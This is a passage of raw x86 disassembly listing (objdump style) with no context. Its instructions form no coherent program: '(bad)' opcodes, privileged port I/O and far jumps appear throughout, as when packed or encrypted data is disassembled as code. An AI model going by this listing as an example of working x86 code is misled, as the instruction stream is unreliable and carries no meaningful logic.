  420399:	mov    dl,0x65
  42039b:	cwde   
  42039c:	mov    ecx,0x5f8fa0a5
  4203a1:	dec    esi
  4203a2:	jns    0x420344
  4203a4:	jmp    0x420349
  4203a6:	sbb    dl,cl
  4203a8:	or     eax,0xdcdfce1d
  4203ad:	ja     0x420388
  4203af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203b0:	jge    0x42036d
  4203b2:	sti    
  4203b3:	and    al,0x4
  4203b5:	mov    dh,0x13
  4203b7:	push   ebp
  4203b8:	jl     0x420435
  4203ba:	inc    edx
  4203bb:	jmp    0x4203f6
  4203bd:	dec    edi
  4203be:	outs   dx,DWORD PTR ds:[esi]
  4203bf:	ret    0xd2b4
  4203c2:	(bad)  
  4203c3:	adc    eax,0xa138707d
  4203c8:	xchg   ebx,eax
  4203c9:	fisttp WORD PTR [eax+0x2758cf36]
  4203cf:	daa    
  4203d0:	sub    eax,0x7cd4182c
  4203d5:	arpl   WORD PTR [edi-0x50],cx
  4203d8:	cmp    eax,0xce719389
  4203dd:	enter  0xfb95,0x17
  4203e1:	cmc    
  4203e2:	(bad)  
  4203e4:	mov    eax,0x70761b86
  4203e9:	xor    DWORD PTR [esi-0x7c],edi
  4203ec:	ja     0x420451
  4203ee:	and    BYTE PTR [ebp+0x165d902f],al
  4203f4:	mov    eax,0x3fcd1b91
  4203f9:	xchg   ebx,eax
  4203fa:	cdq    
  4203fb:	enter  0x392,0x4b
  4203ff:	add    DWORD PTR [edx+0x39ca6cfc],esp
  420405:	ins    DWORD PTR es:[edi],dx
  420406:	sub    BYTE PTR [edx+0x62],0x72
  42040a:	iret   
  42040b:	mov    al,ds:0xe54e6ce4
  420410:	push   esi
  420411:	lea    ecx,[eax+ecx*2+0x5573cb51]
  420418:	ds mov dh,0xc3
  42041b:	pop    esi
  42041c:	in     eax,0x2a
  42041e:	(bad)  
  420420:	inc    edx
  420421:	adc    eax,0xd20369f7
  420426:	mov    dl,0x22
  420428:	push   ds
  420429:	cmc    
  42042a:	inc    eax
  42042b:	and    BYTE PTR [eax+0x4e],dh
  42042e:	cdq    
  42042f:	mov    ecx,0x991a50a1
  420434:	cld    
  420435:	ja     0x420477
  420437:	push   eax
  420438:	ret    0xc26e
  42043b:	pop    ds
  42043c:	push   edx
  42043d:	mov    edx,DWORD PTR [ecx+0x3a809b81]
  420443:	pop    ecx
  420444:	adc    BYTE PTR [edi+0x2d],ah
  420447:	mov    esi,0xf34a33f8
  42044c:	stos   BYTE PTR es:[edi],al
  42044d:	gs dec ebp
  42044f:	shl    BYTE PTR [eax],cl
  420451:	sub    eax,0x869cc3ed
  420456:	mov    eax,0x6119080d
  42045b:	adc    edi,DWORD PTR [eax]
  42045d:	push   es
  42045e:	test   al,0x30
  420460:	fwait
  420461:	int3   
  420462:	dec    esp
  420463:	push   ebp
  420464:	pop    ax
  420466:	sub    DWORD PTR [esi+ebp*4-0x6aa3ce6b],edx
  42046d:	or     eax,0x8b3521bf
  420472:	mov    al,0xe0
  420474:	fcmovnb st,st(3)
  420476:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420477:	lods   al,BYTE PTR ds:[esi]
  420478:	inc    eax
  420479:	sub    ecx,DWORD PTR [ebx-0x25764b01]
  42047f:	aas    
  420480:	das    
  420481:	fiadd  DWORD PTR [esi-0x46]
  420484:	cwde   
  420485:	adc    BYTE PTR [edi+esi*4+0x336d7666],0x19
  42048d:	in     eax,0x60
  42048f:	pop    ss
  420490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420491:	push   ebx
  420492:	dec    ebp
  420493:	push   ss
  420494:	adc    al,0xbd
  420496:	out    dx,al
  420497:	dec    edx
  420498:	inc    edi
  420499:	jnp    0x4204d3
  42049b:	pop    ebp
  42049c:	sbb    BYTE PTR [ebx+0xe2e13e6],al
  4204a2:	sub    al,BYTE PTR [ebp+0x465025c0]
  4204a8:	(bad)  
  4204a9:	xlat   BYTE PTR ds:[ebx]
  4204aa:	lock jne 0x42046c
  4204ad:	jb     0x420476
  4204af:	stos   BYTE PTR es:[edi],al
  4204b0:	xor    dl,BYTE PTR [edi+0x22cc38e5]
  4204b6:	cdq    
  4204b7:	out    dx,al
  4204b8:	lock je 0x42043e
  4204bb:	fwait
  4204bc:	popa   
  4204bd:	loope  0x4204b4
  4204bf:	jge    0x420514
  4204c1:	adc    BYTE PTR fs:[ebp+eax*2+0x2c6264c8],ah
  4204c9:	mov    eax,ds:0xee852c61
  4204ce:	retf   0x54f9
  4204d1:	in     ax,dx
  4204d3:	mov    dl,0xcc
  4204d5:	or     edx,DWORD PTR [edi]
  4204d7:	pop    es
  4204d8:	loopne 0x420542
  4204da:	enter  0x46ca,0x4e
  4204de:	push   0x251e6937
  4204e3:	pop    eax
  4204e4:	mov    cl,0x5c
  4204e6:	xchg   ebp,ebp
  4204e8:	xor    DWORD PTR [eax-0x3d],0xffffff8e
  4204ec:	xor    eax,DWORD PTR [edx+0x66]
  4204ef:	push   ss
  4204f0:	shl    dh,cl
  4204f2:	outs   dx,BYTE PTR ds:[esi]
  4204f3:	adc    eax,0x2c435506
  4204f8:	dec    edi
  4204f9:	push   es
  4204fa:	in     eax,0x5a
  4204fc:	dec    esi
  4204fd:	call   0xd16c:0x14f7f091
  420504:	addr16 push ss
  420506:	sbb    edx,DWORD PTR [eax+0x77ff65ad]
  42050c:	sbb    ecx,DWORD PTR [edi]
  42050e:	xor    BYTE PTR [eax+ebx*8+0x6c],bh
  420512:	xchg   esp,eax
  420513:	retf   0xb267
  420516:	loopne 0x420596
  420518:	mov    al,ah
  42051a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42051b:	ja     0x420520
  42051d:	into   
  42051e:	mov    ch,0xe3
  420520:	aaa    
  420521:	and    eax,DWORD PTR [edx+esi*1+0x51a9643b]
  420528:	cwde   
  420529:	adc    BYTE PTR [si],al
  42052c:	rcr    BYTE PTR [edx+0x29ecc2c6],cl
  420532:	push   esi
  420533:	pop    esp
  420534:	jmp    0x420559
  420536:	(bad)  [ebp-0x9b79662]
  42053c:	jmp    0x9df0:0x820d82f9
  420543:	sbb    al,0xa8
  420545:	test   BYTE PTR [edx],0x19
  420548:	test   DWORD PTR [ebx-0x5412d7f0],eax
  42054e:	push   cs
  42054f:	sub    al,0x2e
  420551:	sbb    al,0x74
  420553:	adc    BYTE PTR [edi],bh
  420555:	add    ebp,DWORD PTR [esi+0x4df3dcd5]
  42055b:	inc    esp
  42055c:	xor    ebp,DWORD PTR ds:0x87cd0c4b
  420562:	dec    eax
  420563:	lods   eax,DWORD PTR ds:[esi]
  420564:	lea    esp,[edx]
  420566:	inc    esp
  420567:	aam    0xcb
  420569:	inc    ecx
  42056a:	mov    al,0x4f
  42056c:	fucomi st,st(3)
  42056e:	mov    dh,0x6e
  420570:	iret   
  420571:	sahf   
  420572:	fistp  DWORD PTR [eax]
  420574:	mov    bl,0x53
  420576:	sub    eax,0x55294745
  42057b:	push   0x49
  42057d:	jg     0x420591
  42057f:	sbb    edx,DWORD PTR [esi+0x47]
  420582:	pop    edi
  420583:	das    
  420584:	sbb    bh,dh
  420586:	and    ebx,esi
  420588:	jmp    0x420557
  42058a:	pop    edx
  42058b:	mov    al,ds:0x9b95ed9e
  420590:	cwde   
  420591:	adc    BYTE PTR [esp+edi*8-0x51],cl
  420595:	stos   BYTE PTR es:[edi],al
  420596:	pop    ebp
  420597:	add    cl,BYTE PTR [esi-0xfab6281]
  42059d:	mov    bl,0x14
  42059f:	pop    esp
  4205a0:	mov    bh,BYTE PTR [ecx]
  4205a2:	int3   
  4205a3:	mov    esp,0x4851b5d8
  4205a8:	adc    BYTE PTR ds:0x4a932446,ch
  4205ae:	mov    esp,0x2a4a85da
  4205b3:	mov    edi,0x1c2fc29d
  4205b8:	aaa    
  4205b9:	sti    
  4205ba:	ficom  WORD PTR [ebp+0x1832fc6d]
  4205c0:	imul   esp,DWORD PTR [edx+0x10],0x9af39227
  4205c7:	mov    ebx,0x10204a96
  4205cc:	pop    ebx
  4205cd:	push   cs
  4205ce:	and    bh,BYTE PTR [ecx+0x4fb55fad]
  4205d4:	call   0x9a59aa16
  4205d9:	(bad)  
  4205da:	in     al,0x61
  4205dc:	xchg   edx,eax
  4205dd:	das    
  4205de:	push   es
  4205df:	dec    ebp
  4205e0:	sub    eax,0x4343ea84
  4205e5:	cwd    
  4205e7:	cmp    ebp,DWORD PTR [ebx-0x251ed6b2]
  4205ed:	inc    ebp
  4205ee:	ret    0xadea
  4205f1:	cwde   
  4205f2:	enter  0xed8b,0x3e
  4205f6:	fild   QWORD PTR [ebp+0x57]
  4205f9:	call   0xb4b9:0x5c44487a
  420600:	mov    al,0x16
  420602:	in     eax,dx
  420603:	aas    
  420604:	jge    0x4205aa
  420606:	xor    ebp,esp
  420608:	ins    DWORD PTR es:[edi],dx
  420609:	sbb    BYTE PTR [esp+ebp*1],ah
  42060c:	push   ss
  42060d:	in     al,dx
  42060e:	jae    0x4205d5
  420610:	pop    eax
  420611:	leave  
  420612:	(bad)  
  420613:	(bad)  
  420614:	aas    
  420615:	and    cl,bh
  420617:	and    BYTE PTR [eax],0xa7
  42061a:	sti    
  42061b:	shl    bh,cl
  42061d:	jns    0x42062f
  42061f:	pushf  
  420620:	push   ecx
  420621:	push   ecx
  420622:	stos   DWORD PTR es:[edi],eax
  420623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420624:	int3   
  420625:	pop    eax
  420626:	adc    bl,al
  420628:	push   cs
  420629:	jae    0x42063f
  42062b:	or     al,0x5
  42062d:	xchg   ebp,eax
  42062e:	dec    esi
  42062f:	mov    edi,0x775a24b7
  420634:	pop    ebp
  420635:	fidiv  WORD PTR [ebx]
  420637:	mov    ebx,0x593b3997
  42063c:	jne    0x42061e
  42063e:	mov    eax,gs:0x4500607e
  420644:	inc    ebp
  420645:	ror    al,cl
  420647:	jb     0x4205e0
  420649:	pop    eax
  42064a:	sbb    cl,BYTE PTR [edx+0x1cb28935]
  420650:	imul   ebx,DWORD PTR [eax],0x51
  420653:	daa    
  420654:	dec    eax
  420655:	mov    bh,0x25
  420657:	adc    edi,DWORD PTR [eax-0x4470cc2a]
  42065d:	ds int3 
  42065f:	lods   eax,DWORD PTR ds:[esi]
  420660:	mov    WORD PTR [eax+0x27],es
  420663:	or     eax,0x37855bc
  420668:	mov    eax,ds:0x36409f4b
  42066d:	fdivr  QWORD PTR [esi+eiz*8+0x5b]
  420671:	mov    DWORD PTR [esi],edx
  420673:	ror    BYTE PTR [eax+ebp*2-0x55],0xe8
  420678:	in     eax,0xa5
  42067a:	dec    edx
  42067b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42067c:	out    0xee,eax
  42067e:	(bad)  
  420680:	mov    esp,0x6d33381d
  420685:	out    dx,eax
  420686:	and    ah,al
  420688:	pop    ebx
  420689:	add    ebp,DWORD PTR [eax-0x69]
  42068c:	pop    ds
  42068d:	xchg   BYTE PTR [edx-0x25],cl
  420690:	dec    ebp
  420691:	icebp  
  420692:	ss or  eax,0x3a1b394d
  420698:	add    eax,0xa721130c
  42069d:	addr16 loop 0x420629
  4206a0:	ret    
  4206a1:	mov    ch,ch
  4206a3:	(bad)  
  4206a4:	mov    al,ds:0x69ffcb65
  4206a9:	fnstenv [edx+0x5da6e5e8]
  4206af:	stos   DWORD PTR es:[edi],eax
  4206b0:	jne    0x4206b5
  4206b2:	nop
  4206b3:	out    0x97,al
  4206b5:	das    
  4206b6:	outs   dx,DWORD PTR ds:[esi]
  4206b7:	add    bl,BYTE PTR [eax]
  4206b9:	push   es
  4206ba:	add    ebx,ebp
  4206bc:	sbb    BYTE PTR [ecx-0x47d8ed02],cl
  4206c2:	push   es
  4206c3:	daa    
  4206c4:	(bad)  
  4206c5:	sti    
  4206c6:	dec    DWORD PTR [ebx-0x23]
  4206c9:	ins    DWORD PTR es:[edi],dx
  4206ca:	xchg   edx,eax
  4206cb:	push   DWORD PTR [edi+0x3c81c8bd]
  4206d1:	jo     0x420667
  4206d3:	pusha  
  4206d4:	mov    eax,ds:0x648a69f5
  4206d9:	lods   al,BYTE PTR ds:[esi]
  4206da:	fidiv  DWORD PTR [ebx-0x5d]
  4206dd:	cmp    DWORD PTR [ebp-0x530b15cd],ebx
  4206e3:	mov    ch,0x1a
  4206e5:	mov    dl,0x36
  4206e7:	pop    eax
  4206e8:	mov    BYTE PTR [eax],dh
  4206ea:	jmp    0x4206ef
  4206ec:	repnz aaa 
  4206ee:	dec    edx
  4206ef:	call   0x311e58a3
  4206f4:	mov    eax,ds:0x8e1316b9
  4206f9:	stos   DWORD PTR es:[edi],eax
  4206fa:	dec    ecx
  4206fb:	push   ebp
  4206fc:	out    dx,eax
  4206fd:	mov    ah,0x9f
  4206ff:	and    BYTE PTR [edi],0xfc
  420702:	mov    esi,0x1733c76f
  420707:	call   0x84366aab
  42070c:	sbb    BYTE PTR [bp-0x3],dl
  420710:	les    esp,FWORD PTR [edi+ecx*2]
  420713:	stc    
  420714:	shl    DWORD PTR [edx],cl
  420716:	cmp    al,0x6f
  420718:	(bad)  
  420719:	lods   al,BYTE PTR ds:[esi]
  42071a:	cs mov dh,0xc
  42071d:	xor    DWORD PTR [ebp+0x7eaaa017],eax
  420723:	pop    cx
  420725:	dec    eax
  420726:	mov    bh,BYTE PTR [ecx+0x14]
  420729:	dec    DWORD PTR [ebp-0xe5b816b]
  42072f:	retf   
  420730:	mov    bh,0x6c
  420732:	sbb    al,0xdd
  420734:	cmc    
  420735:	inc    eax
  420736:	nop
  420737:	mov    edx,0x7f83b590
  42073c:	les    ecx,FWORD PTR [edx-0x4de46b8c]
  420742:	aad    0xa4
  420744:	int3   
  420745:	ds xchg ebx,eax
  420747:	aad    0xb9
  420749:	fdivr  DWORD PTR [ebp+0x1e]
  42074c:	inc    esi
  42074d:	sti    
  42074e:	or     bh,dl
  420750:	iret   
  420751:	adc    BYTE PTR [ecx-0x341a7537],ch
  420757:	adc    esp,DWORD PTR [edx-0x67]
  42075a:	es emms 
  42075d:	retf   0x3229
  420760:	call   0x5d84:0xa4925b45
  420767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420768:	fstp   DWORD PTR [ebp+0x50ed149f]
  42076e:	push   cs
  42076f:	jae    0x420757
  420771:	ss out dx,eax
  420773:	hlt    
  420774:	in     al,dx
  420775:	and    DWORD PTR [eax-0x354372c7],esp
  42077b:	push   eax
  42077c:	xor    DWORD PTR [ecx+0x19],0x7fb36f9a
  420783:	jb     0x42070e
  420785:	inc    edx
  420786:	xor    DWORD PTR [eax+0x1e],ecx
  420789:	pop    ds
  42078a:	cmp    DWORD PTR ds:0x895f5e2,esp
  420790:	sub    al,BYTE PTR [edi+0x22088902]
  420796:	and    DWORD PTR [esi-0x17],ebp
  420799:	aas    
  42079a:	(bad)  
  42079b:	scas   eax,DWORD PTR es:[edi]
  42079c:	imul   ch
  42079e:	mov    ch,0xf3
  4207a0:	jae    0x42079e
  4207a2:	mov    es,WORD PTR cs:[ecx+ebp*4]
  4207a6:	add    eax,0xf95812c8
  4207ab:	xchg   esp,eax
  4207ac:	sahf   
  4207ad:	not    BYTE PTR [ebx+ebx*2]
  4207b0:	adc    ch,ch
  4207b2:	fsub   DWORD PTR [ebx+0x53]
  4207b5:	push   ebp
  4207b6:	ss retf 0x8bd5
  4207ba:	scas   eax,DWORD PTR es:[edi]
  4207bb:	lds    ecx,FWORD PTR [ebp-0x73]
  4207be:	loopne 0x42082a
  4207c0:	stos   BYTE PTR es:[edi],al
  4207c1:	inc    ebx
  4207c2:	leave  
  4207c3:	mov    edi,0x6405a935
  4207c8:	in     al,dx
  4207c9:	outs   dx,DWORD PTR ds:[esi]
  4207ca:	or     al,0x19
  4207cc:	sbb    BYTE PTR ds:0x7583fc34,0xb8
  4207d3:	neg    BYTE PTR [eax]
  4207d5:	imul   BYTE PTR ds:0x44194768
  4207db:	mov    dh,0x72
  4207dd:	scas   al,BYTE PTR es:[edi]
  4207de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207df:	sub    al,0xdf
  4207e1:	les    esi,FWORD PTR [edi-0x49]
  4207e4:	dec    esi
  4207e5:	rol    DWORD PTR [ebx-0x724b695e],0x10
  4207ec:	pop    ebp
  4207ed:	test   al,0xfc
  4207ef:	adc    al,0x42
  4207f1:	sub    ch,ch
  4207f3:	fmul   QWORD PTR [ebp+0x1eba70da]
  4207f9:	push   ebp
  4207fa:	sub    edi,ebp
  4207fc:	push   DWORD PTR [eax+0x46ecb2c3]
  420802:	jnp    0x4207d4
  420804:	and    bl,BYTE PTR [edx+0x1e051b93]
  42080a:	ffree  st(0)
  42080c:	call   0xfd4166fc
  420811:	aam    0xda
  420813:	dec    esi
  420814:	add    bh,BYTE PTR [ebp+0x31]
  420817:	dec    ecx
  420818:	push   DWORD PTR [ecx+0xf17f5d2]
  42081e:	push   ecx
  42081f:	mov    ebp,0x620789cb
  420824:	scas   al,BYTE PTR es:[edi]
  420825:	push   cs
  420826:	out    0xd0,al
  420828:	mov    edx,0x364cd5e7
  42082d:	retf   0xab94
  420830:	and    cl,BYTE PTR [edi]
  420832:	retf   0x7662
  420835:	xor    al,BYTE PTR [eax+0x54]
  420838:	add    al,0x36
  42083a:	outs   dx,BYTE PTR ds:[esi]
  42083b:	mov    ebx,0x3b19b9e
  420840:	(bad)  
  420841:	je     0x4208be
  420843:	ins    DWORD PTR es:[edi],dx
  420844:	fldcw  WORD PTR [ecx]
  420846:	jo     0x420838
  420848:	xor    ecx,DWORD PTR [ebx]
  42084a:	retf   
  42084b:	daa    
  42084c:	sbb    ch,0x76
  42084f:	lea    edx,[edi+0x49d205a8]
  420855:	adc    DWORD PTR [ebx-0x62],ebx
  420858:	and    edi,DWORD PTR [ebx-0x16]
  42085b:	es cmp esp,eax
  42085e:	add    eax,0x613628ea
  420863:	test   DWORD PTR [edx],edi
  420865:	pop    ebx
  420866:	cmc    
  420867:	(bad)  
  420868:	nop
  420869:	lea    ecx,[edx]
  42086b:	mov    al,0x70
  42086d:	call   0x9047907
  420872:	daa    
  420873:	mov    cl,0x30
  420875:	mov    edi,DWORD PTR [edi+0x2bffe11d]
  42087b:	jnp    0x42085e
  42087d:	test   DWORD PTR [ebx-0x36],esp
  420880:	mov    dl,0xf4
  420882:	adc    eax,0x7cbf232d
  420887:	push   cs
  420888:	sar    DWORD PTR ds:0xc02ad771,0xc
  42088f:	fsub   QWORD PTR [ebp-0x74]
  420892:	jmp    FWORD PTR [edi-0x313653ac]
  420898:	mov    al,0xfb
  42089a:	je     0x42090c
  42089c:	jl     0x420837
  42089e:	retf   0x8a72
  4208a1:	mov    al,bl
  4208a3:	sub    eax,0xe04c0e06
  4208a8:	mov    al,ds:0x866d4016
  4208ad:	addr16 mov ds:0xd6fd,al
  4208b1:	aas    
  4208b2:	push   0x16
  4208b4:	dec    edi
  4208b5:	pop    ss
  4208b6:	mov    ecx,DWORD PTR [ecx+ebp*2-0x2f]
  4208ba:	adc    BYTE PTR [edi-0x359203f5],ah
  4208c0:	jbe    0x4208d0
  4208c2:	push   0xb5fc7cab
  4208c7:	xchg   esp,eax
  4208c8:	and    dh,cl
  4208ca:	dec    eax
  4208cb:	pop    esi
  4208cc:	pop    ds
  4208cd:	mov    ch,0x1a
  4208cf:	dec    esp
  4208d0:	xchg   ecx,eax
  4208d1:	stos   BYTE PTR es:[edi],al
  4208d2:	stos   DWORD PTR es:[edi],eax
  4208d3:	mov    ch,ah
  4208d5:	scas   al,BYTE PTR es:[edi]
  4208d6:	xlat   BYTE PTR ds:[ebx]
  4208d7:	test   DWORD PTR [edi-0x13],esi
  4208da:	add    edi,DWORD PTR [ebp+eax*2+0x11]
  4208de:	push   esi
  4208df:	aad    0x34
  4208e1:	fcmovbe st,st(0)
  4208e3:	mov    bl,BYTE PTR es:[edx]
  4208e6:	mov    DWORD PTR [ebx-0x1e91f80],0x23b87bf7
  4208f0:	or     DWORD PTR [ebp+eiz*8+0x7c5ade61],eax
  4208f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208f8:	jne    0x420974
  4208fa:	mov    ecx,0xf6e24946
  4208ff:	pop    ss
  420900:	into   
  420901:	sbb    ecx,DWORD PTR [ebx+0x4a]
  420904:	cmp    bh,ch
  420906:	in     al,dx
  420907:	adc    dl,BYTE PTR [ecx+0x1b]
  42090a:	fwait
  42090b:	in     eax,0xff
  42090d:	push   0x86044ad8
  420912:	sub    ch,BYTE PTR [edx-0x114f3fc3]
  420918:	leave  
  420919:	fcomp  st(0)
  42091b:	adc    DWORD PTR [ebx+0x61b4e0cf],esp
  420921:	add    DWORD PTR [ecx],ebp
  420923:	(bad)  
  420924:	loop   0x4208fc
  420926:	hlt    
  420927:	push   es
  420928:	leave  
  420929:	mov    BYTE PTR [ecx+0x14488baa],cl
  42092f:	mov    edx,0xe13d379e
  420934:	rol    DWORD PTR [esi+0x1],cl
  420937:	inc    ebx
  420938:	and    eax,0x9467516e
  42093d:	scas   al,BYTE PTR es:[edi]
  42093e:	fsubp  st(6),st
  420940:	test   ebp,ebp
  420942:	push   ebp
  420943:	adc    ah,BYTE PTR [edi+0x189eda5a]
  420949:	out    dx,eax
  42094a:	and    esp,DWORD PTR [ecx-0x1a960e64]
  420950:	xor    eax,0xb35bb437
  420955:	sbb    edx,DWORD PTR [eax-0x7e447f47]
  42095b:	pop    esi
  42095c:	push   cs
  42095d:	mov    WORD PTR [edx+0x43],ds
  420960:	lea    edx,[esi+0x78f3d32c]
  420966:	mov    WORD PTR [eax+0x4d],ss
  420969:	sub    ecx,DWORD PTR [ebp-0x5]
  42096c:	pop    es
  42096d:	in     eax,dx
  42096e:	mov    ecx,edi
  420970:	add    BYTE PTR [edi],ch
  420972:	div    bl
  420974:	dec    esi
  420975:	sbb    ebx,DWORD PTR [eax+0x3]
  420978:	aaa    
  420979:	mov    al,ds:0xbf2b6000
  42097e:	mov    WORD PTR [esi-0x238d3f90],?
  420984:	xlat   BYTE PTR ds:[ebx]
  420985:	push   ebx
  420986:	into   
  420987:	mov    ds:0x212cef52,al
  42098c:	sti    
  42098d:	jb     0x42098f
  42098f:	inc    edi
  420990:	sub    al,0x55
  420992:	or     bl,BYTE PTR [edx+0x76]
  420995:	test   BYTE PTR ds:0xe9876726,cl
  42099b:	sbb    esp,DWORD PTR [eax+0x22]
  42099e:	add    ch,BYTE PTR [edi-0xa]
  4209a1:	cmp    esp,edx
  4209a3:	xchg   edi,eax
  4209a4:	sbb    eax,0x134d7aaf
  4209a9:	arpl   WORD PTR [ebx],ax
  4209ab:	mov    ebx,ebx
  4209ad:	push   ds
  4209ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209af:	cli    
  4209b0:	add    BYTE PTR [edi-0x21506f61],0x78
  4209b7:	mov    ah,0x3
  4209b9:	into   
  4209ba:	pop    edi
  4209bb:	outs   dx,DWORD PTR ds:[esi]
  4209bc:	add    eax,esi
  4209be:	es es pusha 
  4209c1:	sub    ch,BYTE PTR [ebx+ebx*8+0x69]
  4209c5:	sti    
  4209c6:	je     0x420996
  4209c8:	fs push 0x19
  4209cb:	mov    esi,0xd6f0085f
  4209d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209d1:	jb     0x420a29
  4209d3:	or     bh,BYTE PTR [edx+0x17]
  4209d6:	and    DWORD PTR fs:[edx],ecx
  4209d9:	out    0x24,eax
  4209db:	call   0x621c4d61
  4209e0:	int    0x95
  4209e2:	xor    al,0xa4
  4209e5:	aas    
  4209e6:	inc    esi
  4209e7:	mov    bh,0xc
  4209e9:	push   esi
  4209ea:	jmp    0x420a69
  4209ec:	fidiv  DWORD PTR [edi]
  4209ee:	out    dx,eax
  4209ef:	lods   eax,DWORD PTR ds:[esi]
  4209f0:	add    eax,0xf63a3209
  4209f5:	dec    edi
  4209f6:	sti    
  4209f7:	pushw  ss
  4209f9:	les    ebx,FWORD PTR [ebx+0x5d]
  4209fc:	mov    ebp,DWORD PTR [esi]
  4209fe:	mov    edi,0xe894b8b4
  420a03:	in     al,dx
  420a04:	adc    DWORD PTR [eax-0x4d417e08],esi
  420a0a:	jno    0x420a79
  420a0c:	retf   
  420a0d:	dec    edi
  420a0e:	div    DWORD PTR [esi+eiz*8-0x6e5ad3c0]
  420a15:	sbb    eax,0x122c6087
  420a1a:	push   cs
  420a1b:	std    
  420a1c:	adc    eax,0xe41608f3
  420a21:	lock adc al,0x96
  420a24:	and    ah,dl
  420a26:	imul   esp,DWORD PTR [ebp-0x514ce82a],0xec9366e8
  420a30:	int3   
  420a31:	mov    ds:0xb5dbd255,eax
  420a36:	mov    al,0xcd
  420a38:	xchg   ebx,eax
  420a39:	inc    esp
  420a3a:	adc    BYTE PTR [ecx+0x62ce0ca],0x4e
  420a41:	pop    es
  420a42:	add    eax,0x1b6197d3
  420a47:	xor    eax,0x95b34b6a
  420a4c:	push   es
  420a4d:	mov    ebx,0xc3850d51
  420a52:	dec    edi
  420a53:	fucomi st,st(5)
  420a55:	inc    esp
  420a56:	and    dh,BYTE PTR [esi]
  420a58:	pop    edx
  420a59:	(bad)  
  420a5a:	sub    eax,0x8984f358
  420a5f:	mov    ah,0xb4
  420a61:	mov    ecx,0x3ac52adc
  420a66:	in     al,dx
  420a67:	fwait
  420a68:	ins    BYTE PTR es:[edi],dx
  420a69:	out    dx,al
  420a6a:	dec    ecx
  420a6b:	div    DWORD PTR [esi+0x28]
  420a6e:	mov    ebp,cs
  420a70:	js     0x420a76
  420a72:	mov    ds:0x27fe3bc4,eax
  420a77:	aaa    
  420a78:	push   es
  420a79:	mov    eax,0xdd40d599
  420a7e:	inc    eax
  420a7f:	pop    ss
  420a80:	out    dx,eax
  420a81:	add    eax,0xc04ead50
  420a86:	push   ecx
  420a87:	mov    ds,WORD PTR [edi+0x28363eac]
  420a8d:	gs and al,0x23
  420a90:	pop    edx
  420a91:	stos   BYTE PTR es:[edi],al
  420a92:	jo     0x420ac1
  420a94:	or     al,0xfe
  420a96:	mov    dl,0x31
  420a98:	xchg   edi,eax
  420a99:	sub    bh,BYTE PTR [edx]
  420a9b:	or     eax,esi
  420a9d:	lds    ebp,FWORD PTR [ebp-0x34a8abd1]
  420aa3:	jb     0x420af2
  420aa5:	cmp    ch,BYTE PTR [eax+0x57]
  420aa8:	(bad)  [edx]
  420aaa:	sub    ah,BYTE PTR [esi-0x3c]
  420aad:	jmp    0xe7ec07ec
  420ab2:	sub    BYTE PTR [ebx],cl
  420ab4:	adc    dh,bh
  420ab6:	xchg   DWORD PTR [edi+0x16],edi
  420ab9:	jo     0x420aaf
  420abb:	push   eax
  420abc:	mov    al,0x79
  420abe:	sub    eax,0x2bc05ee8
  420ac3:	dec    esp
  420ac4:	je     0x420a5f
  420ac6:	cmp    dl,BYTE PTR [eax+0x54046275]
  420acc:	scas   eax,DWORD PTR es:[edi]
  420acd:	jb     0x420af1
  420acf:	xchg   edi,eax
  420ad0:	ret    0x38b
  420ad3:	sub    ah,dl
  420ad5:	cmp    DWORD PTR [eax-0x64],ebp
  420ad8:	(bad)  
  420ad9:	loope  0x420a7f
  420adb:	xor    BYTE PTR cs:[ebp+0x7d33b1fc],dh
  420ae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ae3:	popa   
  420ae4:	fwait
  420ae5:	jne    0x420a8c
  420ae7:	xchg   edx,eax
  420ae8:	cwde   
  420ae9:	(bad)  
  420aea:	mov    ebp,0x8f6506f0
  420aef:	sbb    ah,BYTE PTR [edx-0xd]
  420af2:	sbb    DWORD PTR [ebx+0x2df6906b],esi
  420af8:	stos   DWORD PTR es:[edi],eax
  420af9:	(bad)  
  420afa:	jo     0x420b29
  420afc:	push   esp
  420afd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420afe:	mov    BYTE PTR [esp-0x17339509],ch
  420b05:	es mov ebp,0x145ebc3b
  420b0b:	bound  esi,QWORD PTR [edi+0x383ac2fa]
  420b11:	xchg   ebx,eax
  420b12:	mov    al,0x42
  420b14:	push   esp
  420b15:	inc    eax
  420b16:	push   cs
  420b17:	push   esp
  420b18:	(bad)  
  420b19:	add    esi,DWORD PTR [edx-0x51]
  420b1c:	test   al,0xa5
  420b1e:	je     0x420b5a
  420b20:	mov    bh,0xd8
  420b22:	js     0x420b79
  420b24:	push   ds
  420b25:	xor    BYTE PTR ds:0x16a1a8ca,bh
  420b2b:	test   al,0xc2
  420b2d:	fs xchg ebp,eax
  420b2f:	call   0x28adf817
  420b34:	and    eax,0xca4129c
  420b39:	sahf   
  420b3a:	stc    
  420b3b:	bound  edi,QWORD PTR fs:[esi-0x53]
  420b3f:	mov    ds:0x2edc40f9,al
  420b44:	and    eax,0x84f2a123
  420b49:	std    
  420b4a:	(bad)
  420b4d:	popa   
  420b4e:	std    
  420b4f:	dec    edi
  420b50:	mov    ch,0x16
  420b52:	mov    ebx,0x6e25eb90
  420b57:	imul   eax,DWORD PTR [ebx],0x41f0f6f0
  420b5d:	icebp  
  420b5e:	je     0x420b46
  420b60:	push   ds
  420b61:	or     BYTE PTR ds:0xe04c97af,dh
  420b67:	cs mov eax,0xc8284f01
  420b6d:	hlt    
  420b6e:	pusha  
  420b6f:	shl    ebp,1
  420b71:	jb     0x420ba1
  420b73:	mov    ds:0xed75a449,eax
  420b78:	dec    esi
  420b79:	xor    cl,BYTE PTR [edi]
  420b7b:	or     BYTE PTR [ebx+0x2bb00763],bh
  420b81:	jne    0x420bc7
  420b83:	jno    0x420b0a
  420b85:	aas    
  420b86:	hlt    
  420b87:	call   0x52a9b3b5
  420b8c:	xchg   ecx,eax
